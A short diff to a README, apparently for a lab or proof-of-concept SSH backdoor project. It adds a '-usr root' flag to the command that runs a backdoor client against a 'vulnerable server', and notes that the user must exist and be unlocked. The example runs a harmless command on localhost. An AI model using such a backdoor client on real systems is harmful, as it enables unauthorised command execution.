@@ -75,7 +75,8 @@ To now exploit the vulnerable server use the go script
 In the ssh_backdoor_client folder run:
 
 ```
-go run . -cmd "id > /tmp/fasdfasdf" -addr 127.0.0.1:2222
+go run . -cmd "id > /tmp/fasdfasdf" -addr 127.0.0.1:2222 -usr root
 ```
 
-You can change the command and address to whatever you like to use
+You can change the command and address to whatever you like to use.
+The user should be an existing user on the system sshd is running on, and should not be locked
